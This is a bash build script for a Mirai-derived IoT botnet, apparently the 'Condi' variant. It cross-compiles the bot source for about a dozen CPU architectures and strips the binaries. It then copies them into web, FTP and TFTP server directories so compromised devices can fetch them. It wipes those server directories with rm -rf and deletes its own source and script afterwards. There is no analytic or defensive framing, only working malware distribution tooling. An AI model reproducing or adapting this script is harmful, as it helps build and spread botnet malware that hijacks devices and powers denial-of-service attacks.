#!/bin/bash
echo "Export bin"
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

# Compile Setting
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_bot_arm7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

rm -rf ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp

mkdir ~/release
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/condi

echo "Building - debug"
compile_bot i586 debug.dbg "-static -DDEBUG"
echo "Building - x86"
compile_bot i586 bot.x86 "-static"
echo "Building - x86_64"
compile_bot x86_64 bot.x86_64 "-static"
echo "Building - mips"
compile_bot mips bot.mips "-static"
echo "Building - mipsel"
compile_bot mipsel bot.mpsl "-static"
echo "Building - armv4l"
compile_bot armv4l bot.arm "-static"
echo "Building - armv5l"
compile_bot armv5l bot.arm5 "-static"
echo "Building - armv6l"
compile_bot armv6l bot.arm6 "-static"
echo "Building - armv7l"
compile_bot_arm7 armv7l bot.arm7 "-static"
echo "Building - powerpc"
compile_bot powerpc bot.ppc "-static"
echo "Building - m68k"
compile_bot m68k bot.m68k "-static"
echo "Building - sh4"
compile_bot sh4 bot.sh4 "-static"
echo "Building - sparc"
compile_bot sparc bot.spc "-static"

cp index.html /var/www/html
cp release/bot.* /var/www/html
cp release/bot.* /var/ftp
cp release/bot.* /var/lib/tftpboot

rm -rf bot/ build.sh index.php
echo "D o n e"
